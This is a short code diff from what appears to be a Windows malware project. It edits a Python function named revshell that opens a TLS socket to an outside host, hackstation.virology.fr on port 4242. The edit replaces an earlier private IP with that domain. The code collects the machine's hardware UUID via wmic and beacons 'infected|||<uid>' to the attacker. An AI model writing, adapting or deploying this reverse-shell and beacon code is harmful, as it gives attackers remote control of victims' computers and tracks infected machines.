@@ -34,9 +34,9 @@ def revshell():
 
     raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
-    s = context.wrap_socket(raw_socket, server_hostname="172.26.199.159")
+    s = context.wrap_socket(raw_socket, server_hostname="hackstation.virology.fr")
 
-    s.connect(("172.26.199.159", 4242))
+    s.connect(("hackstation.virology.fr", 4242))
     uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
     s.send(f"infected|||{uid}|||".encode('utf-8'))
 
